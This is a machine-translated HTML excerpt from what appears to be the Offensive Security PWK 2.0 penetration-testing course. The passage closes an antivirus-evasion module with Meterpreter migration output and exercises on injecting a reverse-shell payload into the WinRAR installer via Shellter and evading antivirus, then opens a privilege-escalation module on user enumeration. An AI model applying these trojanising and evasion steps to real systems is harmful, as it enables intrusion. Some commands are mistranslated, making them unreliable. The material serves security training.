<div style="position:absolute;top:83257;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">511</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 成功迁移到进程4832</font></font></nobr></div>
<div style="position:absolute;top:82309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getuid</font></font></font></b></nobr></div>
<div style="position:absolute;top:82326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器用户名：DESKTOP-T27O4CT\offsec</font></font></nobr></div>
<div style="position:absolute;top:82346;left:245"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 513 - 将 meterpreter shell 迁移到新生成的进程中</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迁移完成后，即使我们完成 WinRAR，会话仍将保持活动状态</font></font></nobr></div>
<div style="position:absolute;top:82395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装过程或取消它。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:82429;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.3.3.4 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 在 WinRAR 可执行文件中注入一个 meterpreter 反向 shell 负载。</font></font></nobr></div>
<div style="position:absolute;top:82487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 将二进制文件传输到您的 Windows 客户端并确保它未被检测到</font></font></nobr></div>
<div style="position:absolute;top:82507;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防病毒。</font></font></nobr></div>
<div style="position:absolute;top:82535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 运行 WinRAR 安装程序并迁移您的 Meterpreter shell 以防止断开连接。</font></font></nobr></div>
<div style="position:absolute;top:82563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 尝试使用 Shellter 查找不同的可执行文件并将恶意代码注入其中。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:82601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.4 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们讨论了防病毒软件的用途和最常见的方法</font></font></nobr></div>
<div style="position:absolute;top:82662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">供应商用来检测恶意代码。</font><font style="vertical-align: inherit;">我们简单解释了各种防病毒绕过方法</font></font></nobr></div>
<div style="position:absolute;top:82681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">涉及不同的内存shellcode注入技术并证明是成功的</font></font></nobr></div>
<div style="position:absolute;top:82700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Shellter 和 PowerShell 绕过。</font></font></nobr></div>
<div style="position:absolute;top:82733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管我们在两个示例中都成功绕过了防病毒检测，但我们有</font></font></nobr></div>
<div style="position:absolute;top:82752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几乎没有触及恶意软件检测和规避主题的皮毛。</font><font style="vertical-align: inherit;">如需进一步阅读，</font></font></nobr></div>
<div style="position:absolute;top:82772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了了解恶意软件作者需要付出多少努力才能逃避现代防御，我们</font></font></nobr></div>
<div style="position:absolute;top:82791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鼓励您阅读 Microsoft 的优秀文章“FinFisher 暴露：研究人员的故事”</font></font></nobr></div>
<div style="position:absolute;top:82810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打败陷阱、诡计和复杂的虚拟机”。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">438</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:83193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">438 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:83208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打败陷阱技巧和复杂的虚拟机/ </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:83335;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="71"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 71 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:83368;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:84445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:84445;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:84445;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">512</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:83458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:83484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18. 权限提升</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试期间，我们通常会在系统上获得初步立足点，作为标准或非标准</font></font></nobr></div>
<div style="position:absolute;top:83548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权用户。</font><font style="vertical-align: inherit;">在这些情况下，我们通常会先寻求获得额外的访问权限</font></font></nobr></div>
<div style="position:absolute;top:83567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">展示妥协的全部影响。</font><font style="vertical-align: inherit;">此过程称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限提升</font></font></i></nobr></div>
<div style="position:absolute;top:83586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一项必要的技能，因为“直接到根”的妥协在现代可以说是罕见的</font></font></nobr></div>
<div style="position:absolute;top:83606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境。</font></font></nobr></div>
<div style="position:absolute;top:83638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将假设我们已获得 Windows 和 Linux 上的非特权用户访问权限-</font></font></nobr></div>
<div style="position:absolute;top:83658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于目标，并将在这些目标上演示特权升级技术。</font></font></nobr></div>
<div style="position:absolute;top:83691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然由于操作系统版本、补丁级别和</font></font></nobr></div>
<div style="position:absolute;top:83710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他各种因素，有一些常见的升级方法。</font><font style="vertical-align: inherit;">为了利用这些，我们将</font></font></nobr></div>
<div style="position:absolute;top:83729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索错误配置的服务，对二进制文件或服务的文件权限限制不足，</font></font></nobr></div>
<div style="position:absolute;top:83749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接内核漏洞、以高权限运行的易受攻击的软件、敏感信息</font></font></nobr></div>
<div style="position:absolute;top:83768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在本地文件中，在执行二进制文件之前总是提升权限的注册表设置，</font></font></nobr></div>
<div style="position:absolute;top:83787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能包含硬编码凭据的安装脚本等。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:83825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1 信息收集</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在妥协一个目标并作为非特权用户获得最初的立足点之后，我们的第一步</font></font></nobr></div>
<div style="position:absolute;top:83886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是尽可能多地收集有关我们目标的信息。</font><font style="vertical-align: inherit;">这使我们能够获得更好的</font></font></nobr></div>
<div style="position:absolute;top:83905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解受感染机器的性质并发现可能的途径</font></font></nobr></div>
<div style="position:absolute;top:83925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权升级。</font></font></nobr></div>
<div style="position:absolute;top:83957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将探讨手动</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">439,440</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和自动信息收集和</font></font></nobr></div>
<div style="position:absolute;top:83977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列举技术并讨论每种技术的优点和缺点。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:84011;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:84011;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动枚举系统可能很耗时。</font><font style="vertical-align: inherit;">但是，这种方法允许更多</font></font></nobr></div>
<div style="position:absolute;top:84068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制并可以帮助识别经常被忽略的更多奇特的权限提升方法</font></font></nobr></div>
<div style="position:absolute;top:84088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动化工具。</font></font></nobr></div>
<div style="position:absolute;top:84120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此模块中的某些命令可能需要根据版本进行细微修改</font></font></nobr></div>
<div style="position:absolute;top:84140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标操作系统。</font><font style="vertical-align: inherit;">此外，并非本节中介绍的所有命令都会</font></font></nobr></div>
<div style="position:absolute;top:84159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可在专用客户端上复制。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:84194;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.1 枚举用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在获得对目标的初始访问权限时，我们应该首先确定的事情之一是用户上下文。</font></font></nobr></div>
<div style="position:absolute;top:84248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 和 Linux 平台上都可用</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令是一个很好的起点。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:84375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">439 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（G0tmi1k，2011），https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</font></font></font></nobr></div>
<div style="position:absolute;top:84395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">440 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（模糊安全，2014），https://www.fuzzysecurity.com/tutorials/16.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:84523;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="72"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 72 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:84556;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:85633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:85633;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:85633;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">513</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当不带参数运行时，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将显示运行 shell 的用户名。</font><font style="vertical-align: inherit;">上</font></font></nobr></div>
<div style="position:absolute;top:84671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows，我们可以将发现的用户名作为参数传递给</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net user</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 441</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令以</font></font></nobr></div>
<div style="position:absolute;top:84691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集更多信息。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:84725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\学生&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:84742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">client251\</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生</font></font></font></b></nobr></div>
<div style="position:absolute;top:84776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户学生</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:84793;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></b></nobr></div>
<div style="position:absolute;top:84793;left:344"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:84810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全名</font></font></nobr></div>
<div style="position:absolute;top:84827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论</font></font></nobr></div>
<div style="position:absolute;top:84844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户评论</font></font></nobr></div>
<div style="position:absolute;top:84861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家/地区代码    </font></font></nobr></div>
<div style="position:absolute;top:84861;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">000（系统默认）</font></font></nobr></div>
<div style="position:absolute;top:84878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户有效    </font></font></nobr></div>
<div style="position:absolute;top:84878;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></nobr></div>
<div style="position:absolute;top:84895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户过期    </font></font></nobr></div>
<div style="position:absolute;top:84895;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:84929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后设置的密码    </font></font></nobr></div>
<div style="position:absolute;top:84929;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2018/3/31 上午 10:37:35</font></font></nobr></div>
<div style="position:absolute;top:84946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码过期    </font></font></nobr></div>
<div style="position:absolute;top:84946;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:84963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码可更改    </font></font></nobr></div>
<div style="position:absolute;top:84963;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2018/3/31 上午 10:37:35</font></font></nobr></div>
<div style="position:absolute;top:84980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求输入密码    </font></font></nobr></div>
<div style="position:absolute;top:84980;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不</font></font></nobr></div>
<div style="position:absolute;top:84997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户可以更改密码 是</font></font></nobr></div>
<div style="position:absolute;top:85031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许使用工作站    </font></font></nobr></div>
<div style="position:absolute;top:85031;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
<div style="position:absolute;top:85048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录脚本</font></font></nobr></div>
<div style="position:absolute;top:85065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户资料</font></font></nobr></div>
<div style="position:absolute;top:85082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主目录</font></font></nobr></div>
<div style="position:absolute;top:85099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上次登录    </font></font></nobr></div>
<div style="position:absolute;top:85099;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11/8/2019 下午 12:56:15</font></font></nobr></div>
<div style="position:absolute;top:85133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许登录时间    </font></font></nobr></div>
<div style="position:absolute;top:85133;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:85167;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地组成员 *远程桌面用户 *用户</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全球组成员资格 *无</font></font></nobr></div>
<div style="position:absolute;top:85201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:85220;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 514 - 在 Windows 上获取有关用户的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据上面的输出，我们以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font><font style="vertical-align: inherit;">身份运行</font><font style="vertical-align: inherit;">并收集了额外的</font></font></nobr></div>
<div style="position:absolute;top:85269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括用户所属组的信息。</font></font></nobr></div>
<div style="position:absolute;top:85302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在基于 Linux 的系统上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 442</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来收集用户上下文信息：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:85354;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uid=1000（学生） gid=1000（学生）</font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组=1000（学生）</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85373;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 515 - 在 Linux 上获取有关用户的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示我们作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户操作，它具有用户标识符 (UID) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">443</font></font></font></nobr></div>
<div style="position:absolute;top:85421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 1000 的组标识符 (GID)。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:85529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">441 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2016 年），https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:85544;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2012/cc771865(v%3Dws.11)</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:85563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">442 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 手册页项目，2019 年），http://man7.org/linux/man-pages/man1/id.1.html</font></font></font></nobr></div>
<div style="position:absolute;top:85583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">443 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/User_identifier</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:85711;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="73"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 73 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:85744;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:86821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:86821;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:86821;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">514</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要发现系统上的其他用户帐户，我们可以</font><font style="vertical-align: inherit;">在 Windows 上</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net user</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令-</font></font></nobr></div>
<div style="position:absolute;top:85859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于系统。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户</font></font></font></b></nobr></div>
<div style="position:absolute;top:85928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\CLIENT251 的用户帐户</font></font></nobr></div>
<div style="position:absolute;top:85962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -----------------------------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:85979;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85979;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政人员    </font></font></nobr></div>
<div style="position:absolute;top:85979;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认帐户</font></font></nobr></div>
<div style="position:absolute;top:85996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来宾    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:85996;left:311"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85996;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WDAG公用事业帐户</font></font></nobr></div>
<div style="position:absolute;top:86013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
